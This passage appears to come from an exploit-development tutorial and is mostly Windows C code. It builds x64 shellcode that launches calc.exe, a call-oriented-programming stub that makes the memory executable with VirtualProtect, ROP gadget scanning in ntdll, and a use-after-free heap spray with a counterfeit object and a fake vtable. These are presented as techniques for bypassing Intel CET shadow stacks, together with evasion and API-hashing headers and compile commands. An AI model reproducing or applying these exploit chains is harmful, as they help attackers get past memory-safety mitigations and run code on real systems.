    PVOID scAddr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!scAddr) return FALSE;

    char* cmdStr = (char*)((BYTE*)scAddr + 0x100);
    strcpy(cmdStr, "calc.exe");

    BYTE shellcode[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB9, 0,0,0,0,0,0,0,0,
        0x48, 0xC7, 0xC2, 0x05, 0x00, 0x00, 0x00,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x28,
        0xC3
    };
    *(PVOID*)(shellcode + 6) = cmdStr;
    *(PVOID*)(shellcode + 23) = pWinExec;
    memcpy(scAddr, shellcode, sizeof(shellcode));

    // Build COP stub that calls VirtualProtect then shellcode
    BYTE* copStub = (BYTE*)VirtualAlloc(NULL, 0x200, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!copStub) {
        VirtualFree(scAddr, 0, MEM_RELEASE);
        return FALSE;
    }

    DWORD* pOldProtect = (DWORD*)VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!pOldProtect) {
        VirtualFree(scAddr, 0, MEM_RELEASE);
        VirtualFree(copStub, 0, MEM_RELEASE);
        return FALSE;
    }

    int idx = 0;
    // Save and align stack (must be 16-byte aligned before CALL)
    copStub[idx++] = 0x48; copStub[idx++] = 0x83; copStub[idx++] = 0xEC; copStub[idx++] = 0x28;  // sub rsp, 0x28 (shadow space)

    // Load VirtualProtect args (Windows x64 calling convention: RCX, RDX, R8, R9)
    copStub[idx++] = 0x48; copStub[idx++] = 0xB9;  // mov rcx, scAddr
    *(PVOID*)(copStub + idx) = scAddr; idx += 8;
    copStub[idx++] = 0x48; copStub[idx++] = 0xBA;  // mov rdx, 0x1000
    *(ULONG_PTR*)(copStub + idx) = 0x1000; idx += 8;
    copStub[idx++] = 0x41; copStub[idx++] = 0xB8;  // mov r8d, PAGE_EXECUTE_READ
    *(DWORD*)(copStub + idx) = PAGE_EXECUTE_READ; idx += 4;
    copStub[idx++] = 0x49; copStub[idx++] = 0xB9;  // mov r9, pOldProtect
    *(PVOID*)(copStub + idx) = pOldProtect; idx += 8;

    // Load VirtualProtect address into RAX and CALL it (COP!)
    copStub[idx++] = 0x48; copStub[idx++] = 0xB8;  // mov rax, VirtualProtect
    *(PVOID*)(copStub + idx) = pVP; idx += 8;
    copStub[idx++] = 0xFF; copStub[idx++] = 0xD0;  // call rax (indirect call = COP)

    // Check if VirtualProtect succeeded
    copStub[idx++] = 0x48; copStub[idx++] = 0x85; copStub[idx++] = 0xC0;  // test rax, rax
    copStub[idx++] = 0x74; copStub[idx++] = 0x0F;  // jz skip_shellcode (jump 15 bytes)

    // Load shellcode address into RAX and CALL it (COP!)
    copStub[idx++] = 0x48; copStub[idx++] = 0xB8;  // mov rax, shellcode
    *(PVOID*)(copStub + idx) = scAddr; idx += 8;
    copStub[idx++] = 0xFF; copStub[idx++] = 0xD0;  // call rax (indirect call = COP)

    // skip_shellcode: restore stack and return
    copStub[idx++] = 0x48; copStub[idx++] = 0x83; copStub[idx++] = 0xC4; copStub[idx++] = 0x28;  // add rsp, 0x28
    copStub[idx++] = 0xC3;  // ret

    printf("[+] Shellcode: 0x%p, COP stub: 0x%p (%d bytes)\n", scAddr, copStub, idx);

    // Create fake vtable that points to our COP stub
    VictimVtable* fakeVtable = (VictimVtable*)VirtualAlloc(NULL, sizeof(VictimVtable),
                                                            MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!fakeVtable) {
        VirtualFree(scAddr, 0, MEM_RELEASE);
        VirtualFree(copStub, 0, MEM_RELEASE);
        VirtualFree(pOldProtect, 0, MEM_RELEASE);
        return FALSE;
    }

    fakeVtable->GetId   = (ObjMethod)copStub;
    fakeVtable->GetData = (ObjMethod)copStub;
    fakeVtable->Process = (ObjMethod)copStub;
    fakeVtable->Cleanup = (ObjMethod)copStub;

    // Create a fake object with hijacked vtable
    VictimObject* fakeObj = (VictimObject*)VirtualAlloc(NULL, sizeof(VictimObject),
                                                         MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!fakeObj) {
        VirtualFree(fakeVtable, 0, MEM_RELEASE);
        VirtualFree(scAddr, 0, MEM_RELEASE);
        VirtualFree(copStub, 0, MEM_RELEASE);
        VirtualFree(pOldProtect, 0, MEM_RELEASE);
        return FALSE;
    }

    fakeObj->vtable = fakeVtable;
    fakeObj->id = 0xDEADBEEF;
    fakeObj->data = 0xCAFEBABE;
    fakeObj->buffer = NULL;
    fakeObj->cookie = 0xC0FFEE;

    printf("[*] Triggering COP chain via vtable hijack\n");
    fflush(stdout);

    PVOID vehHandle = AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)COPExceptionHandler);

    BOOL success = FALSE;
    __try {
        fakeObj->vtable->Process(fakeObj);

        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(scAddr, &mbi, sizeof(mbi))) {
            if (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)) {
                printf("[+] VirtualProtect succeeded, shellcode executed\n");
                success = TRUE;
            }
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] Exception: 0x%08X\n", GetExceptionCode());
    }

    if (vehHandle) RemoveVectoredExceptionHandler(vehHandle);

    Sleep(2000);

    VirtualFree(fakeObj, 0, MEM_RELEASE);
    VirtualFree(fakeVtable, 0, MEM_RELEASE);
    VirtualFree(copStub, 0, MEM_RELEASE);
    VirtualFree(scAddr, 0, MEM_RELEASE);
    VirtualFree(pOldProtect, 0, MEM_RELEASE);

    return success;
}

int main() {

    if (!ExploitInitialize(FALSE)) return 1;
    srand((unsigned int)time(NULL));
    printf("=== COP Chain Builder: Vtable Hijack + Exploit Chain ===\n\n");

    printf("[*] Phase 1: Scanning for CALL gadgets\n");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    PBYTE textStart; DWORD textSize;
    int callCount = 0;
    if (hNtdll && GetTextSection(hNtdll, &textStart, &textSize)) {
        for (DWORD i = 0; i < textSize - 2; i++) {
            if (textStart[i] == 0xFF && (textStart[i+1] & 0x38) == 0x10
                && textStart[i+1] != 0x15)  // Exclude call [rip+offset]
                callCount++;
        }
    }
    printf("[+] Found %d indirect CALL instructions in ntdll\n", callCount);

    printf("\n[*] Phase 2: UAF vtable hijack demonstration\n");
    if (UAFVtableHijack()) {
        printf("[+] UAF vtable hijack successful\n");
    } else {
        printf("[-] UAF vtable hijack failed\n");
    }

    printf("\n[*] Phase 3: COP exploit chain\n");
    if (COPExploitChain()) {
        printf("[+] COP exploit complete - calc.exe launched\n");
    } else {
        printf("[-] COP exploit failed\n");
    }

    printf("\n[*] COP bypasses CET shadow stack by using CALL instead of RET\n");
    return 0;
}
```

**Compile & Run:**

```bash
cl src\cop_chain_builder.c /Fe:bin\cop_chain.exe /I.\headers
.\bin\cop_chain.exe
```

### Intel CET Shadow Stack Bypass Techniques

Intel Control-Flow Enforcement Technology (CET) provides hardware-enforced backward-edge CFI via shadow stacks. When a `CALL` instruction executes, the return address is pushed to both the regular stack and a separate shadow stack (protected by the CPU). On `RET`, the CPU compares both addresses — if they don't match, a #CP (Control Protection) exception is raised. This defeats traditional ROP attacks that corrupt return addresses on the stack.

**Bypass Strategy - Data-Only Exploitation**:

Instead of corrupting control flow directly (which CET detects), this implementation demonstrates a complete exploit chain that bypasses CET through data-only attacks:

1. **Use-After-Free (UAF)**: Trigger heap vulnerability by freeing an object but retaining a dangling pointer
2. **Heap Feng Shui**: Spray allocations to reclaim the freed chunk with attacker-controlled data
3. **Counterfeit Object**: Overlay a different object type (type confusion) with controlled vtable pointer
4. **Type Confusion**: Trigger virtual function call on dangling pointer, executing attacker-controlled function
5. **JOP Alternative**: Build Jump-Oriented Programming chain using indirect jumps (no RET instructions)

```c
// cet_shadow_stack_bypass.c
// Demonstrates: UAF -> Counterfeit Object -> Type Confusion -> Arbitrary Code Execution
// Compile: cl src\cet_shadow_stack_bypass.c /Fe:bin\cet_bypass.exe /guard:cf /Zi /I.\headers

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <intrin.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define SYSCALLS_IMPLEMENTATION
#define EVASION_IMPLEMENTATION
#define BYPASS_IMPLEMENTATION

#include "exploit_common.h"
#include "exploit_utils.h"
#include "evasion.h"
#include "bypass.h"
#include "gadget_finder.h"

#define SPRAY_COUNT 0x1000
#define HOLE_SIZE 0x200
#define OBJECT_SIZE 0x100

typedef struct _IMAGE_LOAD_CONFIG_DIRECTORY64_EXTENDED {
    DWORD Size;
    DWORD TimeDateStamp;
    WORD MajorVersion;
    WORD MinorVersion;
    DWORD GlobalFlagsClear;
    DWORD GlobalFlagsSet;
    DWORD CriticalSectionDefaultTimeout;
    ULONGLONG DeCommitFreeBlockThreshold;
    ULONGLONG DeCommitTotalFreeThreshold;
    ULONGLONG LockPrefixTable;
    ULONGLONG MaximumAllocationSize;
    ULONGLONG VirtualMemoryThreshold;
    ULONGLONG ProcessAffinityMask;
    DWORD ProcessHeapFlags;
    WORD CSDVersion;
    WORD DependentLoadFlags;
    ULONGLONG EditList;
    ULONGLONG SecurityCookie;
    ULONGLONG SEHandlerTable;
    ULONGLONG SEHandlerCount;
    ULONGLONG GuardCFCheckFunctionPointer;
    ULONGLONG GuardCFDispatchFunctionPointer;
    ULONGLONG GuardCFFunctionTable;
    ULONGLONG GuardCFFunctionCount;
    DWORD GuardFlags;
    IMAGE_LOAD_CONFIG_CODE_INTEGRITY CodeIntegrity;
    ULONGLONG GuardAddressTakenIatEntryTable;
    ULONGLONG GuardAddressTakenIatEntryCount;
    ULONGLONG GuardLongJumpTargetTable;
    ULONGLONG GuardLongJumpTargetCount;
    ULONGLONG DynamicValueRelocTable;
    ULONGLONG CHPEMetadataPointer;
    ULONGLONG GuardRFFailureRoutine;
    ULONGLONG GuardRFFailureRoutineFunctionPointer;
    DWORD DynamicValueRelocTableOffset;
    WORD DynamicValueRelocTableSection;
    WORD Reserved2;
    ULONGLONG GuardRFVerifyStackPointerFunctionPointer;
    DWORD HotPatchTableOffset;
    DWORD Reserved3;
    ULONGLONG EnclaveConfigurationPointer;
    ULONGLONG VolatileMetadataPointer;
    ULONGLONG GuardEHContinuationTable;
    ULONGLONG GuardEHContinuationCount;
    ULONGLONG GuardXFGCheckFunctionPointer;
    ULONGLONG GuardXFGDispatchFunctionPointer;
    ULONGLONG GuardXFGTableDispatchFunctionPointer;
    ULONGLONG CastGuardOsDeterminedFailureMode;
    ULONGLONG GuardMemcpyFunctionPointer;
} IMAGE_LOAD_CONFIG_DIRECTORY64_EXTENDED, *PIMAGE_LOAD_CONFIG_DIRECTORY64_EXTENDED;

#define IMAGE_GUARD_CF_INSTRUMENTED                    0x00000100
#define IMAGE_GUARD_CFW_INSTRUMENTED                   0x00000200
#define IMAGE_GUARD_CF_FUNCTION_TABLE_PRESENT          0x00000400
#define IMAGE_GUARD_SECURITY_COOKIE_UNUSED             0x00000800
#define IMAGE_GUARD_PROTECT_DELAYLOAD_IAT              0x00001000
#define IMAGE_GUARD_DELAYLOAD_IAT_IN_ITS_OWN_SECTION   0x00002000
#define IMAGE_GUARD_CF_EXPORT_SUPPRESSION_INFO_PRESENT 0x00004000
#define IMAGE_GUARD_CF_ENABLE_EXPORT_SUPPRESSION       0x00008000
#define IMAGE_GUARD_CF_LONGJUMP_TABLE_PRESENT          0x00010000
#define IMAGE_GUARD_RF_INSTRUMENTED                    0x00020000
#define IMAGE_GUARD_RF_ENABLE                          0x00040000
#define IMAGE_GUARD_RF_STRICT                          0x00080000
#define IMAGE_GUARD_RETPOLINE_PRESENT                  0x00100000
#define IMAGE_GUARD_EH_CONTINUATION_TABLE_PRESENT      0x00400000
#define IMAGE_GUARD_XFG_ENABLED                        0x00800000
#define KUSER_SHARED_DATA_ADDRESS 0x7FFE0000ULL
#define KUSER_SHARED_DATA_CET_OFFSET 0x2F8  // Offset to CetFeatures field

typedef struct _PROCESS_MITIGATION_SHADOW_STACKS_POLICY {
    DWORD Flags;
    DWORD Reserved;
} PROCESS_MITIGATION_SHADOW_STACKS_POLICY;

static BOOL CPUSupportsCET() {
    int cpuInfo[4] = {0};
    __cpuidex(cpuInfo, 7, 0);
    return (cpuInfo[2] & (1 << 7)) != 0;
}

static BOOL CPUSupportsIBT() {
    int cpuInfo[4] = {0};
    __cpuidex(cpuInfo, 7, 0);
    return (cpuInfo[3] & (1 << 20)) != 0;
}

static BOOL IsUserModeCETEnabled() {
    typedef BOOL (WINAPI *pGetProcessMitigationPolicy_t)(
        HANDLE hProcess,
        DWORD MitigationPolicy,
        PVOID lpBuffer,
        SIZE_T dwLength
    );
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    if (!hK32) return FALSE;
    pGetProcessMitigationPolicy_t pGetProcessMitigationPolicy =
        (pGetProcessMitigationPolicy_t)GetProcAddress(hK32, "GetProcessMitigationPolicy");
    if (!pGetProcessMitigationPolicy) {
        return FALSE;
    }
    #define ProcessUserShadowStackPolicy 72
    PROCESS_MITIGATION_SHADOW_STACKS_POLICY policy = {0};
    if (pGetProcessMitigationPolicy(GetCurrentProcess(), ProcessUserShadowStackPolicy,
                                    &policy, sizeof(policy))) {
        return (policy.Flags & 0x1) != 0;
    }

    return FALSE;
}

static BOOL IsKernelCETEnabled() {
    __try {
        PDWORD pCetFeatures = (PDWORD)(KUSER_SHARED_DATA_ADDRESS + KUSER_SHARED_DATA_CET_OFFSET);
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery((LPCVOID)KUSER_SHARED_DATA_ADDRESS, &mbi, sizeof(mbi)) == 0) {
            return FALSE;
        }
        DWORD cetFeatures = *pCetFeatures;
        return (cetFeatures & 0x1) != 0;
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
}

static BOOL IsCETEnabled() {
    if (!CPUSupportsCET()) {
        return FALSE;
    }
    if (IsUserModeCETEnabled()) {
        return TRUE;
    }
    if (IsKernelCETEnabled()) {
        return TRUE;
    }
    return FALSE;
}

static BOOL IsCFGEnabled() {
    HMODULE hMod = GetModuleHandleA(NULL);
    if (!hMod) return FALSE;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hMod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    DWORD loadConfigRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
    DWORD loadConfigSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].Size;
    if (!loadConfigRVA || !loadConfigSize) return FALSE;
    PIMAGE_LOAD_CONFIG_DIRECTORY64_EXTENDED loadConfig =
        (PIMAGE_LOAD_CONFIG_DIRECTORY64_EXTENDED)((PBYTE)hMod + loadConfigRVA);
    if (loadConfig->Size < 0x60) {
        return FALSE;
    }
    DWORD flags = loadConfig->GuardFlags;
    return (flags & IMAGE_GUARD_CF_INSTRUMENTED) != 0;
}

static BOOL IsXFGEnabled() {
    HMODULE hMod = GetModuleHandleA(NULL);
    if (!hMod) return FALSE;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hMod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    DWORD loadConfigRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
    DWORD loadConfigSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].Size;
    if (!loadConfigRVA || !loadConfigSize) return FALSE;
    PIMAGE_LOAD_CONFIG_DIRECTORY64_EXTENDED loadConfig =
        (PIMAGE_LOAD_CONFIG_DIRECTORY64_EXTENDED)((PBYTE)hMod + loadConfigRVA);
    if (loadConfig->Size < 0x60) {
        return FALSE;
    }
    DWORD flags = loadConfig->GuardFlags;
    return (flags & IMAGE_GUARD_XFG_ENABLED) != 0;
}

typedef LPVOID (WINAPI *pVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *pVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   (WINAPI *pVirtualFree_t)(LPVOID, SIZE_T, DWORD);
typedef BOOL   (WINAPI *pCreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

static pVirtualAlloc_t   fnVirtualAlloc = NULL;
static pVirtualProtect_t fnVirtualProtect = NULL;
static pVirtualFree_t    fnVirtualFree = NULL;
static pCreateProcessA_t fnCreateProcessA = NULL;

static BOOL ResolveAPIs() {
    HMODULE hK32 = GetModuleByHash(0x6DDB9555);  // kernel32.dll hash
    if (!hK32) {
        hK32 = GetModuleHandleA("kernel32.dll");
        if (!hK32) return FALSE;
    }

    fnVirtualAlloc = (pVirtualAlloc_t)ResolveAPI(hK32, HashAPI("VirtualAlloc"));
    if (!fnVirtualAlloc) fnVirtualAlloc = (pVirtualAlloc_t)GetProcAddress(hK32, "VirtualAlloc");
    fnVirtualProtect = (pVirtualProtect_t)ResolveAPI(hK32, HashAPI("VirtualProtect"));
    if (!fnVirtualProtect) fnVirtualProtect = (pVirtualProtect_t)GetProcAddress(hK32, "VirtualProtect");
    fnVirtualFree = (pVirtualFree_t)ResolveAPI(hK32, HashAPI("VirtualFree"));
    if (!fnVirtualFree) fnVirtualFree = (pVirtualFree_t)GetProcAddress(hK32, "VirtualFree");
    fnCreateProcessA = (pCreateProcessA_t)ResolveAPI(hK32, HashAPI("CreateProcessA"));
    if (!fnCreateProcessA) fnCreateProcessA = (pCreateProcessA_t)GetProcAddress(hK32, "CreateProcessA");
    return (fnVirtualAlloc && fnVirtualProtect && fnVirtualFree && fnCreateProcessA);
}

typedef struct _BASE_OBJECT {
    void **vtable;
    DWORD refCount;
    DWORD flags;
    PVOID userData;
} BASE_OBJECT;

typedef struct _FILE_OBJECT {
    void **vtable;
    DWORD refCount;
    DWORD flags;
    PVOID userData;
    HANDLE hFile;
    WCHAR path[MAX_PATH];
    DWORD fileSize;
    PVOID mappedView;
} FILE_OBJECT;

typedef struct _NETWORK_OBJECT {
    void **vtable;
    DWORD refCount;
    DWORD flags;
    PVOID userData;
    SOCKET sock;
    char hostname[256];
    DWORD port;
    PVOID recvBuffer;
} NETWORK_OBJECT;

static void FileObject_Read(FILE_OBJECT *obj) {
    printf("[*] FileObject::Read() - path: %S, size: %d bytes\n", obj->path, obj->fileSize);
}

static void FileObject_Write(FILE_OBJECT *obj) {
    printf("[*] FileObject::Write() - path: %S\n", obj->path);
}

static void FileObject_Close(FILE_OBJECT *obj) {
    printf("[*] FileObject::Close() - cleaning up\n");
    if (obj->hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(obj->hFile);
        obj->hFile = INVALID_HANDLE_VALUE;
    }
}

static void NetworkObject_Connect(NETWORK_OBJECT *obj) {
    printf("[*] NetworkObject::Connect() - %s:%d\n", obj->hostname, obj->port);
}

static void NetworkObject_Send(NETWORK_OBJECT *obj) {
    printf("[*] NetworkObject::Send() - socket: 0x%llx\n", (DWORD64)obj->sock);
}

static void NetworkObject_Disconnect(NETWORK_OBJECT *obj) {
    printf("[*] NetworkObject::Disconnect()\n");
    if (obj->sock != INVALID_SOCKET) {
        closesocket(obj->sock);
        obj->sock = INVALID_SOCKET;
    }
}

static void *g_fileVtable[] = {
    (void*)FileObject_Read,
    (void*)FileObject_Write,
    (void*)FileObject_Close
};

static void *g_networkVtable[] = {
    (void*)NetworkObject_Connect,
    (void*)NetworkObject_Send,
    (void*)NetworkObject_Disconnect
};

typedef struct _ROP_CHAIN {
    PVOID gadgets[32];
    int count;
} ROP_CHAIN;

static BOOL BuildROPChain(ROP_CHAIN *chain) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    if (!hNtdll || !hK32) {
        printf("[-] Failed to get module handles\n");
        return FALSE;
    }
    PBYTE textStart = NULL;
    DWORD textSize = 0;
    if (!GetTextSection(hNtdll, &textStart, &textSize)) {
        printf("[-] Failed to get .text section\n");
        return FALSE;
    }
    chain->count = 0;
    printf("[*] Scanning ntdll.dll .text section (0x%p, %d bytes)\n", textStart, textSize);
    PVOID popRcx = NULL, popRdx = NULL, popR8 = NULL, popR9 = NULL;
    int gadgetsFound = 0;
    for (DWORD i = 0; i < textSize - 4 && gadgetsFound < 10; i++) {
        BYTE *p = textStart + i;
        if (!popRcx && p[0] == 0x59 && p[1] == 0xC3) {
            popRcx = p;
            printf("    [+] pop rcx; ret @ 0x%p\n", popRcx);
            gadgetsFound++;
        }
        else if (!popRdx && p[0] == 0x5A && p[1] == 0xC3) {
            popRdx = p;
            printf("    [+] pop rdx; ret @ 0x%p\n", popRdx);
            gadgetsFound++;
        }
        else if (!popR8 && p[0] == 0x41 && p[1] == 0x58 && p[2] == 0xC3) {
            popR8 = p;
            printf("    [+] pop r8; ret @ 0x%p\n", popR8);
            gadgetsFound++;
        }
        else if (!popR9 && p[0] == 0x41 && p[1] == 0x59 && p[2] == 0xC3) {
            popR9 = p;
            printf("    [+] pop r9; ret @ 0x%p\n", popR9);
            gadgetsFound++;
        }
    }
    if (!popRcx && !popRdx) {
        printf("[-] No suitable ROP gadgets found\n");
        printf("[*] This is expected on some Windows versions with stripped exports\n");
        return FALSE;
    }
    char *cmd = "calc.exe";
    PVOID pWinExec = GetProcAddress(hK32, "WinExec");
    if (!pWinExec) {
        printf("[-] Failed to resolve WinExec\n");
        return FALSE;
    }
    printf("[*] Target function: WinExec @ 0x%p\n", pWinExec);
    if (popRcx) {
        chain->gadgets[chain->count++] = popRcx;       // pop rcx; ret
        chain->gadgets[chain->count++] = cmd;          // lpCmdLine
    }
    if (popRdx) {
        chain->gadgets[chain->count++] = popRdx;       // pop rdx; ret
        chain->gadgets[chain->count++] = (PVOID)1;     // SW_SHOWNORMAL
    }
    chain->gadgets[chain->count++] = pWinExec;         // WinExec address
    return chain->count > 0;
}

static void DemonstrateROPFailure() {
    printf("\n=== PHASE 1: Traditional ROP Attack ===\n");
    ROP_CHAIN chain = {0};
    if (!BuildROPChain(&chain)) {
        printf("\n[*] ROP chain construction failed (expected on hardened systems)\n");
        return;
    }
    printf("\n[+] Built ROP chain with %d gadgets:\n", chain.count);
    for (int i = 0; i < chain.count; i++) {
        printf("    [%d] 0x%p\n", i, chain.gadgets[i]);
    }
    printf("\n[!] Under CET: Shadow stack would detect RET address mismatch\n");
}

static void SimulateUseAfterFree(FILE_OBJECT **victimPtr) {
    printf("\n=== PHASE 2: Use-After-Free Vulnerability ===\n");

    HANDLE hHeap = GetProcessHeap();
    if (!hHeap) {
        printf("[-] Failed to get process heap\n");
        return;
    }
    printf("[1] Allocating FILE_OBJECT on process heap...\n");
    PVOID *preSpray = (PVOID*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(PVOID) * 0x100);
    for (int i = 0; i < 0x100; i++) {
        preSpray[i] = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(FILE_OBJECT));
    }
    for (int i = 0; i < 0x100; i += 2) {
        HeapFree(hHeap, 0, preSpray[i]);
    }
    FILE_OBJECT *victim = (FILE_OBJECT*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(FILE_OBJECT));
    if (!victim) {
        printf("[-] HeapAlloc failed\n");
        return;
    }
    victim->vtable = g_fileVtable;
    victim->refCount = 1;
    victim->flags = 0x1000;
    victim->hFile = INVALID_HANDLE_VALUE;
    wcscpy_s(victim->path, MAX_PATH, L"C:\\temp\\data.txt");
    victim->fileSize = 1024;
    victim->mappedView = NULL;
    printf("    Address: 0x%p\n", victim);
    printf("    vtable:  0x%p -> [Read, Write, Close]\n", victim->vtable);
    printf("    Heap:    Process heap (LFH enabled)\n");
    printf("\n[2] Normal usage - calling vtable method...\n");
    void (*read_method)(FILE_OBJECT*) = (void(*)(FILE_OBJECT*))victim->vtable[0];
    read_method(victim);
    printf("\n[3] Triggering UAF: HeapFree() but pointer retained...\n");
    if (!HeapFree(hHeap, 0, victim)) {
        printf("[-] HeapFree failed\n");
        return;
    }
    printf("    [!] Chunk freed to LFH (Low Fragmentation Heap)\n");
    printf("    [!] Dangling pointer: 0x%p\n", victim);
    printf("    [!] Memory can be reallocated by heap manager\n");
    printf("\n[4] Heap grooming: Allocating same-sized chunks...\n");
    PVOID *spray = (PVOID*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(PVOID) * SPRAY_COUNT);
    int reclaimIdx = -1;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        spray[i] = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(FILE_OBJECT));
        if (spray[i] == (PVOID)victim) {
            reclaimIdx = i;
            printf("    [+] Reclaimed freed chunk at spray[%d] = 0x%p\n", i, spray[i]);
            NETWORK_OBJECT *controlled = (NETWORK_OBJECT*)spray[i];
            controlled->vtable = g_networkVtable;
            controlled->refCount = 1;
            controlled->flags = 0x2000;
            controlled->sock = (SOCKET)0x4141414141414141;
            strcpy_s(controlled->hostname, sizeof(controlled->hostname), "attacker.com");
            controlled->port = 4444;
            controlled->recvBuffer = NULL;
            break;
        }
    }

    if (reclaimIdx == -1) {
        printf("    [~] Exact reclaim failed (heap randomization)\n");
        printf("    [*] Forcing overlap for demonstration...\n");
        NETWORK_OBJECT *forced = (NETWORK_OBJECT*)victim;
        forced->vtable = g_networkVtable;
        forced->refCount = 1;
        forced->flags = 0x2000;
        forced->sock = (SOCKET)0x4141414141414141;
        strcpy_s(forced->hostname, sizeof(forced->hostname), "attacker.com");
        forced->port = 4444;
        forced->recvBuffer = NULL;
        printf("    [+] Forced overlap at dangling pointer location\n");
    } else {
        printf("    [+] UAF condition achieved: dangling pointer points to controlled memory\n");
    }
    *victimPtr = victim;
    for (int i = 1; i < 0x100; i += 2) {
        if (preSpray[i]) HeapFree(hHeap, 0, preSpray[i]);
    }
    HeapFree(hHeap, 0, preSpray);

}

static void DemonstrateCounterfeitObject(FILE_OBJECT *danglingPtr) {
    printf("\n=== PHASE 3: Counterfeit Object Attack ===\n");
    HANDLE hHeap = GetProcessHeap();
    printf("[1] Exploiting UAF: Overlaying NETWORK_OBJECT over freed FILE_OBJECT...\n");
    NETWORK_OBJECT *counterfeit = (NETWORK_OBJECT*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(NETWORK_OBJECT));
    printf("    Counterfeit allocation: 0x%p\n", counterfeit);
    printf("    Dangling pointer:       0x%p\n", danglingPtr);
    if (counterfeit != (NETWORK_OBJECT*)danglingPtr) {
        printf("    [~] Addresses differ (heap randomization)\n");
        printf("    [*] Proceeding with conceptual demonstration...\n\n");
        counterfeit = (NETWORK_OBJECT*)danglingPtr;
    } else {
        printf("    [+] Perfect overlap achieved!\n\n");
    }
    counterfeit->vtable = g_networkVtable;
    counterfeit->refCount = 1;
    counterfeit->flags = 0x2000;
    counterfeit->sock = (SOCKET)0x4141414141414141;
    strcpy_s(counterfeit->hostname, sizeof(counterfeit->hostname), "attacker.com");
    counterfeit->port = 4444;
    counterfeit->recvBuffer = NULL;
    printf("[2] Counterfeit object crafted:\n");
    printf("    Type confusion: FILE_OBJECT -> NETWORK_OBJECT\n");
    printf("    vtable:  0x%p (attacker-controlled)\n", counterfeit->vtable);
    printf("    Socket:  0x%llx\n", (DWORD64)counterfeit->sock);
    printf("    Target:  %s:%d\n", counterfeit->hostname, counterfeit->port);
    printf("\n[3] Victim code dereferences dangling FILE_OBJECT pointer...\n");
    printf("    Code: fileObj->vtable[0](fileObj)  // Expects FileObject_Read()\n");
    FILE_OBJECT *filePtr = (FILE_OBJECT*)danglingPtr;
    if (filePtr->vtable != g_fileVtable) {
        printf("    [+] vtable corrupted: 0x%p (was 0x%p)\n", filePtr->vtable, g_fileVtable);
    }
    printf("\n[4] Triggering type confusion via virtual call...\n");
    void (*vtable_method)(void*) = (void(*)(void*))filePtr->vtable[0];
    printf("    Calling: 0x%p\n", vtable_method);
    vtable_method(filePtr);
    printf("\n[+] Type confusion successful!\n");
}

static void DemonstrateDataOnlyExploit() {
    printf("\n=== PHASE 4: Data-Only Exploitation ===\n");
    printf("[*] Leveraging type confusion for arbitrary code execution...\n");
    printf("\n[1] Scenario: Counterfeit object with controlled function pointer\n");
    PVOID fakeVtable[3];
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    PVOID pWinExec = GetProcAddress(hK32, "WinExec");
    PVOID pVirtualProtect = GetProcAddress(hK32, "VirtualProtect");
    PVOID pCreateThread = GetProcAddress(hK32, "CreateThread");
    fakeVtable[0] = pWinExec;
    fakeVtable[1] = pVirtualProtect;
    fakeVtable[2] = pCreateThread;
    printf("    Fake vtable: 0x%p\n", fakeVtable);
